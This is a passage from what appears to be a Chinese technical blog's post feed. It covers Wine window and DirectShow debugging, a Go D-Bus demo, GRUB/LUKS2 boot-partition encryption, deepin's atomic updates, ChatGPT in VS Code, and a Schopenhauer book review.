class="line">    HRESULT hr = <span class="built_in">OleLoadPictureEx</span>(pStream, <span class="number">0</span>, FALSE, IID_IMyInterface, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, (<span class="keyword">void</span> **)&amp;pPicture);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">SUCCEEDED</span>(hr))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 获取图标句柄</span></span><br><span class="line">        HICON hIcon = <span class="literal">NULL</span>;</span><br><span class="line">        pPicture-&gt;<span class="built_in">get_Handle</span>((OLE_HANDLE*)&amp;hIcon);</span><br><span class="line">        <span class="keyword">return</span> hIcon;</span><br><span class="line">        <span class="comment">// 设置窗口类的图标</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li>发现图标显示正常显示，日志也与呼叫器窗口创建保持一致</li>
</ol>
<h3 id="猜测3："><a href="#猜测3：" class="headerlink" title="猜测3："></a>猜测3：</h3><ol>
<li>菜单栏图标显示简介：菜单栏在对系统来说也是一个进程，每个进程在菜单栏进行显示需要进程提供窗口类型，窗口消息，窗口图标等，同样菜单栏移除显示也会遵循某种规则</li>
<li>通过猜测1中的<code>xwininfo</code>的<code>xwininfo -tree -root</code>命令获取到系统菜单栏的进程是<code>cods-desktop</code><br><img src="/2023/09/13/wine-%E5%91%BC%E5%8F%AB%E5%99%A8%E7%AA%97%E5%8F%A3%E9%97%AE%E9%A2%98%E5%88%86%E6%9E%90/6.png" alt="图6"></li>
<li><code>cdos</code>是Cromemco 推出的一种类似 CP/M 的操作系统，猜测方德是桌面系统是沿用cdos系统源码，但菜单栏属于深度diy的代码，上游开源代码可能与nfs相差比较大，所以暂未考虑查看上游代码进行排查问题</li>
<li><code>cdos-desktop --help</code>发现增加参数可以输出日志，编写脚本将日志输出至终端<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">/bin/sh</span></span><br><span class="line">export GTK_DEBUG=all</span><br><span class="line">killall cdos-desktop</span><br><span class="line">cdos-desktop -b</span><br></pre></td></tr></table></figure></li>
<li>运行程序捕捉日志，发现呼叫器启动后菜单栏将其进行移除<br><img src="/2023/09/13/wine-%E5%91%BC%E5%8F%AB%E5%99%A8%E7%AA%97%E5%8F%A3%E9%97%AE%E9%A2%98%E5%88%86%E6%9E%90/7.png" alt="图7"></li>
<li>通过猜测2中的源码观察，大致可以理清呼叫器窗口创建流程，创建父窗口-&gt;创建子窗口-&gt;隐藏父窗口，编写demo进行验证，demo较简单（/呼叫器/code/win.c） <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">hwndParent = <span class="built_in">CreateWindowEx</span>(<span class="number">0</span>, parentClassName, <span class="string">&quot;Parent&quot;</span>, WS_OVERLAPPEDWINDOW, CW_USEDEFAULT, CW_USEDEFAULT, <span class="number">800</span>, <span class="number">800</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, hInstance, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">ShowWindow</span>(hwndParent, nCmdShow);</span><br><span class="line"><span class="built_in">UpdateWindow</span>(hwndParent);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建子窗口</span></span><br><span class="line">hwndChild = <span class="built_in">CreateWindowEx</span>(<span class="number">0</span>, childClassName, <span class="string">&quot;child&quot;</span>, WS_OVERLAPPEDWINDOW, <span class="number">200</span>, <span class="number">200</span>, <span class="number">200</span>, <span class="number">150</span>, hwndParent, <span class="literal">NULL</span>, hInstance, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">ShowWindow</span>(hwndParent, SW_HIDE);</span><br><span class="line"><span class="built_in">ShowWindow</span>(hwndChild, nCmdShow);</span><br><span class="line"><span class="built_in">UpdateWindow</span>(hwndChild);</span><br></pre></td></tr></table></figure></li>
<li>在nfs系统上进行验证，发现同样菜单栏下无法显示图标</li>
</ol>
<h2 id="分析结论"><a href="#分析结论" class="headerlink" title="分析结论"></a>分析结论</h2><pre><code>通过上述分析与验证代码，可以初步猜测在nfs系统上使用wine创建子窗口与父窗口时隐藏父窗口，会使cdos-desktop程序将进程任务栏图标进行移除。在nfs验证后，将同样wine代码与测试代码在deepin进行验证，未发现异常问题，图标正常显示。
</code></pre>
<h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><ul>
<li>方案1： 与系统组沟通修改cdos-desktop的bug（时间较长，暂不考虑）</li>
<li>方案2：修改父窗口属性，在父窗口被移除时的窗口属性中，不增加<code>_NET_WM_STATE_SKIP_TASKBAR</code>代码如下<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">@@ <span class="number">-1059</span>,<span class="number">6</span> +<span class="number">1059</span>,<span class="number">9</span> @@ <span class="function"><span class="keyword">void</span> <span class="title">update_net_wm_states</span><span class="params">( struct x11drv_win_data *data )</span></span></span><br><span class="line"><span class="function">             <span class="title">if</span> <span class="params">(!(new_state &amp; (<span class="number">1</span> &lt;&lt; i)))</span> <span class="keyword">continue</span></span>;</span><br><span class="line">             TRACE( <span class="string">&quot;setting wm state %u for unmapped window %p/%lx\n&quot;</span>,</span><br><span class="line">                    i, data-&gt;hwnd, data-&gt;whole_window );</span><br><span class="line">+	    <span class="keyword">if</span>(i == NET_WM_STATE_SKIP_TASKBAR) &#123;</span><br><span class="line">+		    <span class="keyword">continue</span>;</span><br><span class="line">+	    &#125;</span><br><span class="line">             atoms[count++] = X11DRV_Atoms[net_wm_state_atoms[i] - FIRST_XATOM];</span><br><span class="line">             <span class="keyword">if</span> (net_wm_state_atoms[i] == XATOM__NET_WM_STATE_MAXIMIZED_VERT)</span><br><span class="line">                 atoms[count++] = x11drv_atom(_NET_WM_STATE_MAXIMIZED_HORZ);</span><br></pre></td></tr></table></figure>
修改后效果如下：<br>  <img src="/2023/09/13/wine-%E5%91%BC%E5%8F%AB%E5%99%A8%E7%AA%97%E5%8F%A3%E9%97%AE%E9%A2%98%E5%88%86%E6%9E%90/8.png" alt="图8"></li>
</ul>
<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>一个问题产生后，可以先看看问题现象，找到产生问题的操作规律，从操作上可以大胆推测问题出现的可能出现的几种原因，然后再通过测试用例或者其它手段一一排除。同样的功能，代码实现的方法有多种，写测试用例前，可以网上查看下实现一个功能比较常见的几种手法，这样可以缩小apimonitor监控的过滤范围。结合apimonitor调用的接口，再写测试用例就可以比较准确的复现问题。</p>
]]></content>
      <categories>
        <category>wine</category>
      </categories>
      <tags>
        <tag>wine</tag>
      </tags>
  </entry>
  <entry>
    <title>【Linux技术分享】go实现简单dbus</title>
    <url>/2023/08/07/go%E7%AE%80%E5%8D%95%E5%AE%9E%E7%8E%B0dbus/</url>
    <content><![CDATA[<h1 id="go实现简单dbus"><a href="#go实现简单dbus" class="headerlink" title="go实现简单dbus"></a>go实现简单dbus</h1><p><em><strong>实现一个控制访问权限的dbus demo，<a href="https://github.com/lk-me/nfs-hotpot-regist">代码地址</a>。</strong></em></p>
<span id="more"></span>

<h1 id="nfs-hotpot-regist"><a href="#nfs-hotpot-regist" class="headerlink" title="nfs-hotpot-regist"></a>nfs-hotpot-regist</h1><pre><code>`nfs-hotpot-regist`目前为dbus框架，用于后期存储nfs系统上的hotpot信息，使用go开发。
</code></pre>
<h3 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h3><ul>
<li>单例</li>
<li>调用者校验，包括权限与调用者名称</li>
<li>提供存储与读取接口</li>
<li>将信息存储值属性中，实现秒读取</li>
<li>提供日志模块，将日志存储至系统日志中</li>
</ul>
<h3 id="debian-ubuntu"><a href="#debian-ubuntu" class="headerlink" title="/debian/ubuntu"></a>/debian/ubuntu</h3><ul>
<li>apt install libdbus-1-dev</li>
<li>在主目录使用makefile编译</li>
<li>make</li>
<li>sudo make install</li>
<li>sudo ./nfs-hotpot-regist</li>
</ul>
<h3 id="模块介绍"><a href="#模块介绍" class="headerlink" title="模块介绍"></a>模块介绍</h3><ul>
<li><code>/cmd</code>主程序目录</li>
<li><code>/config</code>存放配置文件</li>
<li><code>/test</code>测试程序，目前用c开发测试dbus接口</li>
<li><code>/pkg/logger</code>日志模块</li>
<li><code>/pkg/hotpot</code>主程序逻辑模块</li>
<li><code>/pkg/module</code>主程序调用模块</li>
</ul>
<h3 id="todo"><a href="#todo" class="headerlink" title="todo"></a>todo</h3><ul>
<li>接口功能待实现</li>
<li>日志模块后期修改为输出至文件</li>
<li>单元测试</li>
</ul>
]]></content>
      <categories>
        <category>go</category>
      </categories>
      <tags>
        <tag>Linux技术分享</tag>
      </tags>
  </entry>
  <entry>
    <title>【Linux技术分享】wine-无法打开视频驱动设置弹窗根因分析</title>
    <url>/2023/06/13/wine-%E6%97%A0%E6%B3%95%E6%89%93%E5%BC%80%E8%A7%86%E9%A2%91%E9%A9%B1%E5%8A%A8%E8%AE%BE%E7%BD%AE%E5%BC%B9%E7%AA%97%E6%A0%B9%E5%9B%A0%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h1 id="wine-无法打开视频驱动设置弹窗根因分析"><a href="#wine-无法打开视频驱动设置弹窗根因分析" class="headerlink" title="wine-无法打开视频驱动设置弹窗根因分析"></a>wine-无法打开视频驱动设置弹窗根因分析</h1><span id="more"></span>


<h1 id="问题现象"><a href="#问题现象" class="headerlink" title="问题现象"></a>问题现象</h1><p>用户在使用摄像头捕捉软件时，windows下点击属性设置button时，可以弹出关于设置当前使用摄像头属性窗口，在wine下点击无响应，在windows显示弹窗如下：<br><img src="/2023/06/13/wine-%E6%97%A0%E6%B3%95%E6%89%93%E5%BC%80%E8%A7%86%E9%A2%91%E9%A9%B1%E5%8A%A8%E8%AE%BE%E7%BD%AE%E5%BC%B9%E7%AA%97%E6%A0%B9%E5%9B%A0%E5%88%86%E6%9E%90/1.png" alt="图1"><br>经测试在不同摄像头插入时，弹出窗口界面展示不同。</p>
<h1 id="问题定位"><a href="#问题定位" class="headerlink" title="问题定位"></a>问题定位</h1><ol>
<li>使用spy++分析窗口组成，发现组成窗口都是由windows api绘制<br><img src="/2023/06/13/wine-%E6%97%A0%E6%B3%95%E6%89%93%E5%BC%80%E8%A7%86%E9%A2%91%E9%A9%B1%E5%8A%A8%E8%AE%BE%E7%BD%AE%E5%BC%B9%E7%AA%97%E6%A0%B9%E5%9B%A0%E5%88%86%E6%9E%90/2.png" alt="图2"></li>
<li>通过google搜图，发现此窗口为通用窗口，在obs等摄像头捕捉软件都存在。</li>
</ol>
<p>根据以上确定此窗口非当前软件绘制，为windows的提供的摄像头设置窗口。</p>
<h1 id="问题分析"><a href="#问题分析" class="headerlink" title="问题分析"></a>问题分析</h1><ol>
<li><p>根据<code>问题定位</code>，发现设置属性窗口为windows提供。通过google可以了解windows视频录制框架大致为Windows Media Foundation（WMF）与DirectShow，在wine中通过模块开启发现应用通过DirectShow框架捕捉视频</p>
<ul>
<li>DirectShow：DirectShow 是一种基于 COM 的框架，可用于创建和管理音频和视频流。它提供了一组可编程的组件，称为过滤器，用于捕获、压缩、转换和渲染音频和视频流。应用程序可以使用 DirectShow 来捕获和编码视频，然后将其保存为文件或流式传输到网络。</li>
</ul>
</li>
<li><p>查询msdn，了解DirectShow属性页弹出基本原理，编写demo（demo代码见文件夹demo），发现弹出界面与应用弹出设置界面一致</p>
<ul>
<li><p>属性页原理：DirectShow滤镜是一个COM对象，因此它实现了IUnknown接口，包括QueryInterface方法。在DirectShow中，每个滤镜都可以实现不同的接口来提供不同的功能，例如播放音频和视频、录制视频、捕获窗口等等。为了获取滤镜支持的特定接口，您可以使用滤镜对象的QueryInterface方法，并提供要获取的接口的IID（接口标识符）。ISpecifyPropertyPages接口是DirectShow中用于获取滤镜属性页的接口之一。当您调用pFilter-&gt;QueryInterface(IID_ISpecifyPropertyPages, (void**)&amp;pSpecPropPages)函数时，DirectShow会检查该滤镜是否支持ISpecifyPropertyPages接口。如果滤镜支持该接口，则DirectShow会返回S_OK，并将ISpecifyPropertyPages接口的指针存储在pSpecPropPages变量中。</p>
  <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">hr = pBaseFilter-&gt;<span class="built_in">QueryInterface</span>(IID_ISpecifyPropertyPages, (<span class="keyword">void</span>**)&amp;pSpecPropPages);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">SUCCEEDED</span>(hr)) &#123;</span><br><span class="line">    hr = pSpecPropPages-&gt;<span class="built_in">GetPages</span>(pCaGUID);</span><br><span class="line">    pSpecPropPages-&gt;<span class="built_in">Release</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
<ol start="3">
<li>将windows的demo移动至wine中进行运行，发现设置弹出未弹出，通过日志观察，发现运行至vfw_capture_query_interface函数中获取com接口时，返回E_NOINTERFACE<br><img src="/2023/06/13/wine-%E6%97%A0%E6%B3%95%E6%89%93%E5%BC%80%E8%A7%86%E9%A2%91%E9%A9%B1%E5%8A%A8%E8%AE%BE%E7%BD%AE%E5%BC%B9%E7%AA%97%E6%A0%B9%E5%9B%A0%E5%88%86%E6%9E%90/3.png" alt="图3"><br><img src="/2023/06/13/wine-%E6%97%A0%E6%B3%95%E6%89%93%E5%BC%80%E8%A7%86%E9%A2%91%E9%A9%B1%E5%8A%A8%E8%AE%BE%E7%BD%AE%E5%BC%B9%E7%AA%97%E6%A0%B9%E5%9B%A0%E5%88%86%E6%9E%90/4.png" alt="图4"></li>
</ol>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>wine未实现IID_ISpecifyPropertyPages接口，导致点击设置属性button无响应。窗口显示流程可以大致为 <code>用户点击属性设置窗口-&gt;windows获取驱动可设置参数-&gt;根据参数组成设置界面-&gt;显示至用户</code>。目前wine在<code>windows获取驱动可设置参数</code>步骤中未实现。</p>
<h1 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h1><p>方案1：调研windows获取驱动可设置参数接口如何实现，在wine中进行代码补充<br>优点：彻底解决窗口无法弹出问题，可对wine的DirectShow有较大的技术积累<br>缺点：耗时较长，需要调研问题较多，要把windows关于DirectShow驱动设置流程与linux摄像头驱动设置流程进行分析，再结合wine代码对其进行补充。</p>
<p>方案2：与开发厂商进行沟通，在程序启动时，提供默认设置，设置属性窗口可不弹出也可使用软件。<br>优点：可快速有效解决厂商问题。<br>缺点：在wine中根据图4代码，只能设置基础项，可能无法满足用户设置并且此方案为临时方案不通用。。</p>
]]></content>
      <categories>
        <category>wine</category>
      </categories>
      <tags>
        <tag>wine</tag>
      </tags>
  </entry>
  <entry>
    <title>【Linux技术分享】deepin实现boot分区加密</title>
    <url>/2023/04/19/deepin%E5%AE%9E%E7%8E%B0boot%E5%88%86%E5%8C%BA%E5%8A%A0%E5%AF%86/</url>
    <content><![CDATA[<h1 id="deepin实现boot分区加密"><a href="#deepin实现boot分区加密" class="headerlink" title="deepin实现boot分区加密"></a>deepin实现boot分区加密</h1><p><em><strong>当前linux下的磁盘加密，为了保证系统的正常启动，一般不会将引导分区进行加密。luck2在grub2.06版本以后支持了boot分区加密，但是仍然无法支持mbr分区格式的引导加密，本文旨在解决此问题</strong></em></p>
<span id="more"></span>
<h2 id="问题起因"><a href="#问题起因" class="headerlink" title="问题起因"></a>问题起因</h2><p>在原子更新开发时，发现引导项需要保存至/boot分区中，但是/boot分区的存储空间固定的，再多个版本迭代进行更新后会出现分区空间不足问题，此时需考虑将引导向的备份存储至其他分区。如果用户选择了全盘加密，在用户的grub内核选择阶段，必须将加密磁盘解密，否则找到当前备份的内核文件，此时问题则变为如何在grub阶段或者在grub阶段前将磁盘进行解密，等效于加密/boot分区后如何在grub阶段前将/boot分区进行解密。</p>
<h2 id="boot分区解密"><a href="#boot分区解密" class="headerlink" title="boot分区解密"></a>boot分区解密</h2><h3 id="mbr启动流程"><a href="#mbr启动流程" class="headerlink" title="mbr启动流程"></a>mbr启动流程</h3><ol>
<li><p>mbr主要组成为core.img的结构，首先是diskboot.img，接下来是解压缩程序lzma_decompress.img，再往下是kernel.img，最后是各个模块module对应的映像，细节查看，<a href="http://www.pixelbeat.org/docs/disk/%E3%80%82">http://www.pixelbeat.org/docs/disk/。</a><br><img src="/2023/04/19/deepin%E5%AE%9E%E7%8E%B0boot%E5%88%86%E5%8C%BA%E5%8A%A0%E5%AF%86/1.png" alt="图1"></p>
</li>
<li><p>首先读取第一扇区的boot.img，该文件处的某处一定保存了整个core.img的起始扇区，然后从该起始扇区处首先读取一个扇区，即diskboot.img，该映像的结尾处保存了后续映像的长度，根据该长度读取这些数据，数据的头部即lzma_decompress.img映像又保存了加压缩的参数，例如压缩文件的大小，以及解压缩后文件的大小，根据这些参数对后续数据进行解压缩，得到kernel.img以及各个module模块的映像起始地址，最后进入kernel.img的入口函数继续执行，具体模块查看<a href="https://www.gnu.org/software/grub/manual/grub/html_node/Images.html%E3%80%82">https://www.gnu.org/software/grub/manual/grub/html_node/Images.html。</a></p>
</li>
</ol>
<h3 id="uefi启动流程"><a href="#uefi启动流程" class="headerlink" title="uefi启动流程"></a><del>uefi启动流程</del></h3><h3 id="grub2-06-luks2-mbr"><a href="#grub2-06-luks2-mbr" class="headerlink" title="grub2.06+luks2+mbr"></a>grub2.06+luks2+mbr</h3><p>根据mbr启动流程，我们可知，将我们的解密代码存放至core文件中，即可在grub加载前对磁盘进行解密。</p>
<ol>
<li>创建脚本grub-pre.cfg内容如下</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cryptomount -a</span><br><span class="line">set root&#x3D;crypto0</span><br><span class="line">set prefix&#x3D;($root)&#x2F;grub</span><br><span class="line">insmod normal</span><br><span class="line">normal</span><br></pre></td></tr></table></figure>

<ol start="2">
<li><p>生成img文件， grub-mkimage -p /boot/grub -O i386-pc -c grub-pre.cfg -o /boot/grub/i386-pc/core2.img luks2 part_gpt cryptodisk gcry_rijndael pbkdf2 gcry_sha256 ext2 part_msdos biosdisk</p>
</li>
<li><p>将img文件写入磁盘头，grub-bios-setup -b i386-pc/boot.img -c i386-pc/core2.img /dev/sda</p>
</li>
<li><p>效果如下<br><img src="/2023/04/19/deepin%E5%AE%9E%E7%8E%B0boot%E5%88%86%E5%8C%BA%E5%8A%A0%E5%AF%86/1.png" alt="图1"></p>
</li>
</ol>
<h3 id="grub2-06-luks1"><a href="#grub2-06-luks1" class="headerlink" title="grub2.06+luks1"></a>grub2.06+luks1</h3><p>deepin的20.8需要将luks2降至luks1,但在efi与mbr下都能实现引导加密，具体的操作可以看debian的<a href="https://cryptsetup-team.pages.debian.net/cryptsetup/encrypted-boot.html">官方文档</a></p>
<h3 id="grub2-06-luks2-efi"><a href="#grub2-06-luks2-efi" class="headerlink" title="grub2.06+luks2+efi"></a>grub2.06+luks2+efi</h3><p>在grub2.06版本上对引导加密方案是部分支持，具体细节跟加密步骤查看<a href="https://wiki.archlinux.org/title/GRUB#LUKS2">arch的wiki</a></p>
]]></content>
      <categories>
        <category>原子更新</category>
      </categories>
      <tags>
        <tag>Linux技术分享</tag>
      </tags>
  </entry>
  <entry>
    <title>【Linux技术分享】原子更新调研分析（二）deepin原子更新调研开发</title>
    <url>/2023/04/18/%E5%8E%9F%E5%AD%90%E6%9B%B4%E6%96%B0%E8%B0%83%E7%A0%94%E5%88%86%E6%9E%90%EF%BC%88%E4%BA%8C%EF%BC%89deepin%E5%8E%9F%E5%AD%90%E6%9B%B4%E6%96%B0%E8%B0%83%E7%A0%94/</url>
    <content><![CDATA[<h1 id="原子更新调研分析（二）deepin原子更新调研开发"><a href="#原子更新调研分析（二）deepin原子更新调研开发" class="headerlink" title="原子更新调研分析（二）deepin原子更新调研开发"></a>原子更新调研分析（二）deepin原子更新调研开发</h1><p><em><strong>deepin的原子开发告一段落，项目已经交给社区维护，仓库在：<a href="https://github.com/linuxdeepin/deepin-upgrade-manager%E3%80%82%E9%A2%84%E8%AE%A1%E5%86%99%E5%87%A0%E7%AF%87%E6%96%87%E6%A1%A3%E8%AE%B0%E5%BD%95%E4%B8%8B%E5%BC%80%E5%8F%91%E7%9A%84%E7%BB%86%E8%8A%82%E4%B8%8E%E5%88%9D%E8%A1%B7%EF%BC%8C%E7%AE%97%E6%98%AF%E5%AF%B9%E8%BF%99%E4%B8%AA%E9%A1%B9%E7%9B%AE%E7%9A%84%E6%80%BB%E7%BB%93%E5%8F%AD%E3%80%82">https://github.com/linuxdeepin/deepin-upgrade-manager。预计写几篇文档记录下开发的细节与初衷，算是对这个项目的总结叭。</a></strong></em></p>
<span id="more"></span>
<h2 id="原子更新是什么"><a href="#原子更新是什么" class="headerlink" title="原子更新是什么"></a>原子更新是什么</h2><pre><code>原子更新是对deepin系统级别的备份方案，为什么叫原子更新呢？原子说明本次操作是不可中断的，连一起意思就是本次系统更新是可靠的，可逆的，不可中断的意思，旨在解决deepin的系统更新不稳定的问题，若存在系统更新崩溃可随时回到之前备份的任意节点，保证系统数据。
</code></pre>
<h2 id="老版本存在问题"><a href="#老版本存在问题" class="headerlink" title="老版本存在问题"></a>老版本存在问题</h2><ol>
<li>deepin在v20以及v20之前，在系统备份的时候使用的都是ab分区。ab分区的劣势主要是只能支持全盘分区的，像自定义分区的就无法支持，并且只能备份一个版本，有时候a,b版本的备份内容都存在问题时就很棘手，无法找到之前版本了。</li>
<li>ab备份的时候，全盘安装的时候会多一个分区来存储系统文件，当时的主分区无法调整，就是因为ab分区需要空间太大了这个原因，如果主分区是要30g空间，那个备份分区也需要30g,会对磁盘空间有较大浪费。</li>
<li>备份时间较长，在ab分区的时候，需要将主分区内容全部拷贝到另一个分区，如果是机械磁盘，耗费的时候就是非常长的了。</li>
</ol>
<h2 id="原子更新优势"><a href="#原子更新优势" class="headerlink" title="原子更新优势"></a>原子更新优势</h2><ol>
<li>可以备份任意版本，多个数量系统版本</li>
<li>由于是增量备份，所以备份速度较快，回滚也较快，占据空间较小。</li>
</ol>
<h2 id="原子更新劣势"><a href="#原子更新劣势" class="headerlink" title="原子更新劣势"></a>原子更新劣势</h2><ol>
<li>与debian的管理包应用的软件耦合较低，无法做到像rpm-ostree对每一个应用进行备份管理。</li>
<li>由于第一个原因，所以备份的时候需要对系统进行一个文件校验，查询每次安装应用后增加的应用，有时间消耗。</li>
</ol>
<h2 id="未来展望"><a href="#未来展望" class="headerlink" title="未来展望"></a>未来展望</h2><ol>
<li>希望与系统耦合增加，能明确知道每次应用更新内容</li>
<li>增加只读根分区功能，通过原子更新来组成os进行系统更新</li>
<li>系统更新应该是一个阻塞功能，用户不能进行对系统进行操作，类比windows/手机的系统更新。</li>
<li>改造ostree,当前ostree是单线程，原子更新备份与回滚是为阻塞操作，可以将其改造为多线程操作。</li>
</ol>
<h2 id="实现原理简介"><a href="#实现原理简介" class="headerlink" title="实现原理简介"></a>实现原理简介</h2><p>原子更新的具体实现在github上的<a href="https://github.com/linuxdeepin/deepin-upgrade-manager/blob/master/docs/deepin-atomic-upgrade_outline_detailed_design.tex">概要设计</a>，这里简单讲一下，并把一些遇到的困难点记录一下。原子更新由于是系统级别应用，需要尽可能减少依赖，所以使用<code>go</code>开发，主要分层如下图：<img src="/2023/04/18/%E5%8E%9F%E5%AD%90%E6%9B%B4%E6%96%B0%E8%B0%83%E7%A0%94%E5%88%86%E6%9E%90%EF%BC%88%E4%BA%8C%EF%BC%89deepin%E5%8E%9F%E5%AD%90%E6%9B%B4%E6%96%B0%E8%B0%83%E7%A0%94/1.png" alt="图1"></p>
<ol>
<li>其中deepin-boot-kit是管理grub显示更新，原子更新的grub引导项展示由此模块支持，后期可以讲一下这个模块以及grub原理。</li>
<li>原子更新支持命令行与dbus两种方案的调用，dbus则为通用接口，命令行则为了在initramfs下使用。</li>
<li>用户可以使用 commit,init,rollback,version的直接命令调用原子更新</li>
<li>原子更新内部则封装ostree的命令，实现底层接口，后期ostree也可以换其他的文件级别的备份方案。</li>
</ol>
<h2 id="开发困难点"><a href="#开发困难点" class="headerlink" title="开发困难点"></a>开发困难点</h2><ol>
<li>自动选择最大分区</li>
<li>断电回滚，重启后继续回滚</li>
<li>引导分区的加密</li>
<li>提交时快速找到系统增量文件，提交至ostree仓库</li>
<li>回滚时，快速建立rootfs对系统进行替换</li>
</ol>
]]></content>
      <categories>
        <category>原子更新</category>
      </categories>
      <tags>
        <tag>Linux技术分享</tag>
      </tags>
  </entry>
  <entry>
    <title>【问题解决】chatgpt使用</title>
    <url>/2023/02/23/chatgpt%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<h1 id="chatgpt学习与工作上应用"><a href="#chatgpt学习与工作上应用" class="headerlink" title="chatgpt学习与工作上应用"></a>chatgpt学习与工作上应用</h1><p><em><strong>vscode下使用chatgpt加快工作效率。</strong></em></p>
<span id="more"></span>

<p>在一个领域刚入门的时候，可能一头雾水没办法精准的确定需求告诉google自己想要什么，只能够模糊搜索再慢慢确认自己的需求，但是我们现在有了chatgpt,可以将大致需求告诉他，你会给你一个<code>看起来</code>很精准的结果，注意是看起来，笔者自验在chatgpt与微软的msdn搜索的api进行对比发现还是有些许出入。我们可以把chatgpt比喻成图书管理员，具体知识他可能不大清楚，但是他可以帮助你剩下很长时间确定在哪个位置。</p>
<p>在vscode上使用chatgpt,需要对vscode进行代理配置，在设置中搜索<code>proxy</code>进行代理配置（如果使用sock5需要把完整的代理链接都贴上去），第一次登陆chatgpt会要求输入<code>key</code>进行配置，<code>key</code>的获取需要登陆<code>openai</code>。配置完成后其效果如下：<img src="/2023/02/23/chatgpt%E4%BD%BF%E7%94%A8/%E5%9B%BE1.jpg" alt="图1"></p>
<p>推荐一个开源项目，把微信机器人与chatgpt绑定一起了，实现一个ai好友。<a href="https://github.com/SnapdragonLee/ChatGPT-weBot%E3%80%82">https://github.com/SnapdragonLee/ChatGPT-weBot。</a></p>
]]></content>
      <categories>
        <category>问题解决</category>
      </categories>
      <tags>
        <tag>问题解决</tag>
      </tags>
  </entry>
  <entry>
    <title>【读书有感】读《人生的智慧》</title>
    <url>/2022/10/16/%E8%AF%BB%E4%BA%BA%E7%94%9F%E7%9A%84%E6%99%BA%E6%85%A7/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p><em><strong>《人生的智慧》 一本引人入胜而又充满智慧的哲学书。</strong></em></p>
<span id="more"></span>

<p>什么是人生的智慧呢？在我看来是对人生的态度，在对一些客观发生的悲剧时，倘若长时间的陷入痛苦与自责，往往会让自己生陷入悲剧之中，在此时对平常的细小的问题时总会容易易怒，充满负面情绪，但若转换自身角度，在悲伤过后总结问题原因从而警戒自己，当我们遇到相同或者类似问题时，就会回想当时的痛苦与自责从而避免悲剧发生。</p>
<p>叔本华这本《人生的智慧》阐述的如何尽量快乐的度过这一生，算得上是哲学的幸福论，对于幸福每个人的定义不同，对于我而言我每周会去吃顿烧烤/火锅/日料去放松下自身紧绷的身体，这就是对我的幸福，但若对于已经饿了数天的乞丐来说，此时能吃上白面馒头难道他的幸福感不会比我高的多么？</p>
<p>更好是好的敌人，痛苦是产生快乐的根源，他们不是反义词而是近义词，对于个体来讲存在痛苦才会产生快乐，身边简单的幸福感总是难以被重视或者看见，就像一位双眼视力正常的人很难想象拥有一双正常的双眼对失明的人多快乐。只有经历了巨大的灾难才能感受到自身已存在的幸福。如何评断当前是否幸福呢？当我们每天都只为了细小的事情烦恼时，那应该就是最幸福的时候，所以要珍惜这段时光。</p>
<p>强烈推荐买一本进行阅读，是一本很有价值的指导生活的哲学书籍~</p>
<h2 id="摘抄"><a href="#摘抄" class="headerlink" title="摘抄"></a>摘抄</h2><ul>
<li>理性的人寻求的不是快乐，而只是没有痛苦。</li>
<li>快乐只不过是一场梦，但痛苦确实真实存在的。</li>
<li>节制食物会让我们身体健康，节制与人交往会让我们心灵平静。</li>
<li>因此谁在早年就喜欢上独处，他就不音获得了一个金矿。 当然，不是行一个人都能够这样做。这是因为正如人们当初受到资乏的驱赶而聚集在一起，一且解决了匮乏，无聊同样会把人们驱赶到一块。没有了既乏和无聊，人们或许就会孤身独处，虽然这只是因为每个人都自认为很重要，其至认为自己是独一无二的， 而独处时，周围的环境恰好适合如此评价，因为生活在拥挤、繁杂的世人中，就会变得举步维艰，痛苦掣肘不断，自己心目中的重要性就会消失殆尽。在这种意义上说，独处甚至是每一个人自然的、合适的生活状态:它使每一个人都像亚当那样重新享受原初的、与自己本性相符的幸福快乐。</li>
<li>正如一个人背负着自己的身体重负却一无所觉， 而在移动他人的身体时却感到了重量，同理，他不会注意到自己身上的缺点和恶习，只会留意他人的这些东西。因此，每个人都应该以他人为镜，从这面镜子可以清楚地看到自己的缺点、恶习及其他让人厌恶之处。不过，在大多数情况下，人们却像一条对着镜 子咆哮的狗，因为它不知道它在镜子中看着自己，而以为那是另外条狗。挑剔别人缺点差错的人也是在改进着自己。所以，倾向和习惯于在私下默默留意别人的外在行为，刻薄挑剔别人不论做过的抑或不曾做过的事情的人，也因此在改进和完善着自己，因为这种人起码有足够的公正或者足够的骄傲和虚荣心去避免做出他们经常如此严厉、苛刻批评的事情。对于那些容忍别人的人来说，则是相反，即：我们给予自己各种自由，也同样让别人有各种自由。</li>
<li>我们不应该驳斥别人的看法，而应该记住，如果试图用说话使个人放弃他所相信的种种谬误，那就算我们有玛土撒拉的寿命，也不会完成任务。另外，在与别人谈话时，我们不要试图矫正别人，尽管我们所说的话出于善意;因为冒犯和得罪别人是很容易的，但要对此作出弥补，就算并非不可能，也是相当困难的。如果我们碰巧听到别人说出的荒谬言论开始让我们生气，我们就要想象这只是一部喜剧中两个愚人之间的对话。这一事实久经证明: 谁来到这个世上，在最重要的问题上-本正经地教育人们，那么，如果他能全身而退就已经是万幸了。</li>
